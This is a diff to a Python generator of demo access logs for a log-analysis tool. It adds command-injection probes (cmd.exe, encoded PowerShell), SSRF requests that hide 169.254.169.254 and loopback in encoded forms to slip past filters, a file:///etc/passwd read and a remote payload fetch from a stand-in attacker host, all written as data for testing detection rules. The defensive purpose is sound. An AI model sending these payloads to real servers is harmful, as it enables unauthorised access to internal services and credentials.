@@ -512,19 +512,25 @@ def bulk_registration(ip: str, day: int, hour: int) -> None:
 
 
 def forced_browsing(ip: str, day: int, hour: int) -> None:
-    """Twelve refusals across ten paths in under two minutes.
+    """Sixteen requests to admin paths that answer in three different ways.
 
-    Refused, not missing — 403 rather than 404. The distinction is the whole
-    rule: a miss means the thing is not there, a refusal means it is there and
-    guarded, and somebody working through a list of guarded things is doing
+    Twelve refusals first — 403 rather than 404, and that distinction is the
+    whole rule: a miss means the thing is not there, a refusal means it is there
+    and guarded, and somebody working through a list of guarded things is doing
     something different from somebody mapping what exists.
 
-    The two redirects at the end are a third answer again: bounced to a login
-    page rather than refused outright, which `admin_area_redirect` reads on its
-    own. They live on this client rather than on the signed-in admin at
-    198.51.100.20 because that rule is graded hostile — putting it there flagged
-    the one client in the log whose job is to be a clean counter-example, and a
-    demonstration of a false alarm is not what that client is for.
+    Then two redirects, bounced to a login page rather than refused outright,
+    which `admin_area_redirect` reads on its own. They live on this client
+    rather than on the signed-in admin at 198.51.100.20 for a reason that has
+    since expired — the rule was `access_control` when this was written and
+    flagged the one client whose job is to be a clean counter-example. It is
+    `authentication` at `info` now and would no longer do that. The requests
+    stay here because they are also true of this client.
+
+    And two successes last, which is what the other two answers are for. A
+    client that collects both a refusal and a success on admin paths got through
+    somewhere, and `forced_browsing_succeeded` is the only rule in the tree that
+    can say so.
     """
     t = at(day, hour)
     for path in (
@@ -545,6 +551,13 @@ def forced_browsing(ip: str, day: int, hour: int) -> None:
         t += timedelta(seconds=9)
     for path in ("/admin", "/phpmyadmin"):
         write(t, ip, f"GET {path} HTTP/1.1", 302, 0, agent=CURL)
+        t += timedelta(seconds=9)
+
+    # Two routes that never learned to check a role, so they answer 200 to the
+    # same client the twelve above refused. Without these the demo log has no
+    # request where somebody who should not be there got through.
+    for path in ("/admin/ping", "/admin/template"):
+        write(t, ip, f"GET {path} HTTP/1.1", 200, 940, agent=CURL)
         t += timedelta(seconds=9)
 
 
@@ -641,10 +654,15 @@ def xss_attempts(ip: str, day: int, hour: int) -> None:
 def command_injection(ip: str, day: int, hour: int) -> None:
     """Unix first, then Windows batch.
 
-    The Windows lines are here deliberately even though most of them are not
-    caught: family 932 sits at 9% and `attack/windows.yaml` does not exist yet.
-    A demo log that only contained things the rules already catch would flatter
-    the tool, and the gap is easier to argue about when you can point at it.
+    The Windows lines were here before anything could read them — family 932 sat
+    at 9% and `attack/windows.yaml` did not exist — on the principle that a demo
+    log containing only what the rules already catch flatters the tool, and a gap
+    is easier to argue about when you can point at it.
+
+    **The pack exists now**, and these are the lines it was written from: a FOR
+    loop with a switch, `cmd.exe /c`, PowerShell with an encoded command, and an
+    `if exist` test. Each of the three rules in that pack fires on one of them,
+    which is how the demo log keeps its promise that every rule is reachable.
     """
     t = at(day, hour)
     for probe in (
@@ -655,6 +673,9 @@ def command_injection(ip: str, day: int, hour: int) -> None:
         "/ping?host=for%20%2Ff%20%22tokens%3D%2A%22%20%25%25G%20IN%20%28%27dir%20%2Fb%27%29%20DO%20echo%20%25%25G",
         "/ping?host=cmd.exe%20%2Fc%20whoami",
         "/ping?host=powershell%20-enc%20SQBFAFgA",
+        # `if exist … ` — the batch conditional, which is the third shape in
+        # the pack and the one the other lines here do not carry.
+        "/ping?host=if%20exist%20c%3A%5Cwindows%5Csystem32%20echo%20yes",
     ):
         write(t, ip, f"GET {probe} HTTP/1.1", 500, 0, agent=CURL)
         t += timedelta(seconds=11)
@@ -740,13 +761,31 @@ def headless_client(ip: str, day: int, hour: int) -> None:
 
 
 def ssrf_attempts(ip: str, day: int, hour: int) -> None:
-    """Cloud metadata, loopback, and a file:// scheme no browser would send."""
+    """Cloud metadata, loopback, and a file:// scheme no browser would send.
+
+    The last four are the same targets written so a check for them will not
+    recognise them: 2852039166 and 0xa9fea9fe are both 169.254.169.254 in one
+    integer, `[::ffff:7f00:1]` is loopback as a mapped IPv6 address, and the
+    ideographic full stops in the last are not the `.` any pattern looks for.
+    They are here because a demonstration that only shows the plain forms shows
+    the easy half of the problem.
+    """
     t = at(day, hour)
     for probe in (
         "/fetch?url=http%3A//169.254.169.254/latest/meta-data/",
         "/fetch?url=http%3A//127.0.0.1%3A6379/",
         "/fetch?url=file%3A///etc/passwd",
         "/fetch?url=gopher%3A//127.0.0.1%3A11211/_stats",
+        # Not an internal address at all — somebody else's server, which is
+        # remote file inclusion rather than SSRF-to-self. It is the one probe
+        # here that logarc cannot judge on its own: `/fetch?url=` to
+        # `https://shop.test/...` would be ordinary, and only knowing that
+        # shop.test is this site makes cdn.attacker.test different.
+        "/fetch?url=https%3A//cdn.attacker.test/payload.txt",
+        "/fetch?target=http%3A//2852039166/latest/meta-data/",
+        "/fetch?target=http%3A//0xa9fea9fe/",
+        "/fetch?target=http%3A//%5B%3A%3Affff%3A7f00%3A1%5D/",
+        "/fetch?target=http%3A//169%E3%80%82254%E3%80%82169%E3%80%82254/",
     ):
         write(t, ip, f"GET {probe} HTTP/1.1", 502, 0, agent=NUCLEI)
         t += timedelta(seconds=9)
@@ -985,7 +1024,12 @@ def check() -> int:
 
     root = Path(__file__).resolve().parents[2]
     rules = load_rules([root / "src" / "logarc" / "detect" / "rulepacks"])
-    engine = RuleEngine(rules)
+    # Built knowing the site's own name, because one rule is deliberately silent
+    # until somebody supplies it: `rfi_offsite_url` compares a URL in a
+    # parameter against the hosts the reader named, and with nothing named it
+    # never fires. Passing SITE here is this log playing the reader who answered
+    # — which is also the state the demo is meant to show.
+    engine = RuleEngine(rules, site_hosts=(SITE,))
     parser = get_parser("apache-vhost-combined")
 
     # Grouped by client, because window rules need a client's requests together
